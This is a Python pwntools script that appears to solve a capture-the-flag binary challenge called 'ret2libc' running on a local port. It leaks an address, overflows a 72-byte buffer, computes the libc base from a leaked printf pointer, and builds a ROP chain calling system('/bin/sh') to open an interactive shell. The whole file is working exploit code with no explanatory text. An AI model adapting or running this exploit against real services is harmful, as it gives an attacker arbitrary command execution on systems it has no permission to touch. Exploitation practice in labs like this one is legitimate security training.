#!/usr/bin/env python3
from pwn import *
import re

HOST = "127.0.0.1"
PORT = 4005

context.log_level = "info"
context.arch = "amd64"
context.bits = 64

PADDING = 72   # adjust if needed

def parse_addr_from_line(line: bytes):
    m = re.search(br"0x[0-9a-fA-F]+", line)
    if not m:
        return None
    return int(m.group(0), 16)

def main():
    p = remote(HOST, PORT)

    # Leak printf_finder addr
    data = p.recvuntil(b"lokasinya ada di:", timeout=5)
    rest = p.recvline(timeout=2)
    addr_pf = parse_addr_from_line(rest)
    if not addr_pf:
        addr_pf = parse_addr_from_line(data + rest)
    if not addr_pf:
        log.error("Could not find printf_finder address.")
        return

    log.success(f"Found printf_finder at {hex(addr_pf)}")

    # Stage 1 payload
    payload1 = b"A" * PADDING + p64(addr_pf)
    p.sendlineafter(b"Kalau mau, kamu bisa kasih kami masukan:", payload1)

    # Read until we see the real printf leak
    leaked_printf = None
    for _ in range(5):
        line = p.recvline(timeout=2)
        log.info(f"Got line: {line!r}")
        addr = parse_addr_from_line(line)
        if addr:
            leaked_printf = addr
            break

    if not leaked_printf:
        log.error("Failed to parse leaked printf address.")
        return

    log.success(f"Leaked printf pointer: {hex(leaked_printf)}")

    # Compute libc base
    libc = ELF("./attachment/libc.so.6", checksec=False)
    libc_base = leaked_printf - libc.symbols["printf"]
    libc.address = libc_base
    log.success(f"Computed libc base: {hex(libc_base)}")

    # Load main binary to find pop rdi gadget
    elf = ELF("./attachment/ret2libc", checksec=False)  # adjust path if needed
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

    system_addr = libc.symbols["system"]
    binsh = next(libc.search(b"/bin/sh"))

    log.info(f"Using pop rdi gadget at {hex(pop_rdi)}")
    log.info(f"system: {hex(system_addr)}, /bin/sh: {hex(binsh)}")

    payload2 = b"A" * PADDING
    payload2 += p64(pop_rdi)
    payload2 += p64(binsh)
    payload2 += p64(system_addr)

    p.sendline(payload2)
    p.interactive()

if __name__ == "__main__":
    main()

